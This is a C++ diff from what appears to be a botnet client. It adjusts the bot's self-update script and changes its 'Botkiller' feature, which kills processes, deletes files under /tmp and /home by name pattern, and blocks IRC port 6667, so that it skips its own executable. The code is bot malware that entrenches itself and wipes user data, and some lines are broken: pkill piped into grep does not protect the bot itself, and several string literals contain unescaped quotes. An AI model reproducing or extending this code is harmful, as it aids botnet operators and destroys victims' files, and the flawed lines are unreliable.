@@ -304,13 +304,15 @@ public:
                             #ifdef _WIN32
                             updateScript = "@echo off\n";
                             updateScript += "timeout /t 2 /nobreak > nul\n";
-                            updateScript += "move /y bot_new " + std::string(exePath) + "\n";
+                            updateScript += "copy /y \"" + std::string(exePath) + "\" bot_backup\n";
+                            updateScript += "copy /y bot_new \"" + std::string(exePath) + "\"\n";
                             updateScript += "\"" + std::string(exePath) + "\"\n";
                             updateScript += "del "%~f0"\n";
                             #else
                             updateScript = "#!/bin/bash\n";
                             updateScript += "sleep 2\n";
-                            updateScript += "mv bot_new \"" + std::string(exePath) + "\"\n";
+                            updateScript += "cp \"" + std::string(exePath) + "\" bot_backup\n";
+                            updateScript += "cp bot_new \"" + std::string(exePath) + "\"\n";
                             updateScript += "\"" + std::string(exePath) + "\"\n";
                             updateScript += "rm -- "$0"\n";
                             #endif
@@ -644,8 +646,16 @@ public:
                     
                     std::string scanResults = "";
                     
-                    // Check for suspicious processes
-                    FILE* psPipe = popen("ps aux | grep -E '(bot|malware|backdoor|trojan|virus|keylogger|spyware)' | grep -v grep", "r");
+                    // Check for suspicious processes (exclude self)
+                    char selfPath[1024];
+                    #ifdef _WIN32
+                    GetModuleFileNameA(NULL, selfPath, sizeof(selfPath));
+                    #else
+                    readlink("/proc/self/exe", selfPath, sizeof(selfPath));
+                    #endif
+                    std::string selfPathStr = std::string(selfPath);
+                    std::string psCmd = "ps aux | grep -E '(bot|malware|backdoor|trojan|virus|keylogger|spyware)' | grep -v grep | grep -v '" + selfPathStr + "'";
+                    FILE* psPipe = popen(psCmd.c_str(), "r");
                     if (psPipe) {
                         char buffer[256];
                         std::string suspiciousProcesses = "";
@@ -661,8 +671,9 @@ public:
                         }
                     }
                     
-                    // Check for suspicious files
-                    FILE* findPipe = popen("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null", "r");
+                    // Check for suspicious files (exclude self)
+                    std::string findCmd = "find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null | grep -v '" + selfPathStr + "'";
+                    FILE* findPipe = popen(findCmd.c_str(), "r");
                     if (findPipe) {
                         char buffer[256];
                         std::string suspiciousFiles = "";
@@ -708,15 +719,17 @@ public:
                     
                     std::string killResults = "";
                     
-                    // Kill suspicious processes
-                    FILE* killPipe = popen("pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null", "r");
+                    // Kill suspicious processes (exclude self)
+                    std::string killCmd = "pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null | grep -v '" + selfPathStr + "'";
+                    FILE* killPipe = popen(killCmd.c_str(), "r");
                     if (killPipe) {
                         pclose(killPipe);
                         killResults += "Suspicious processes terminated.\n";
                     }
                     
-                    // Remove suspicious files
-                    FILE* removePipe = popen("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \; 2>/dev/null", "r");
+                    // Remove suspicious files (exclude self)
+                    std::string removeCmd = "find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null | grep -v '" + selfPathStr + "' | xargs rm -f 2>/dev/null";
+                    FILE* removePipe = popen(removeCmd.c_str(), "r");
                     if (removePipe) {
                         pclose(removePipe);
                         killResults += "Suspicious files removed.\n";
@@ -734,11 +747,13 @@ public:
                     // Complete cleanup
                     log("Botkiller clean - complete malware removal");
                     
-                    // Kill all suspicious processes
-                    system("pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null");
+                    // Kill all suspicious processes (exclude self)
+                    std::string cleanKillCmd = "pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null | grep -v '" + selfPathStr + "'";
+                    system(cleanKillCmd.c_str());
                     
-                    // Remove all suspicious files
-                    system("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \; 2>/dev/null");
+                    // Remove all suspicious files (exclude self)
+                    std::string cleanRemoveCmd = "find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null | grep -v '" + selfPathStr + "' | xargs rm -f 2>/dev/null";
+                    system(cleanRemoveCmd.c_str());
                     
                     // Block all suspicious ports
                     system("iptables -A INPUT -p tcp --dport 6667 -j DROP 2>/dev/null");
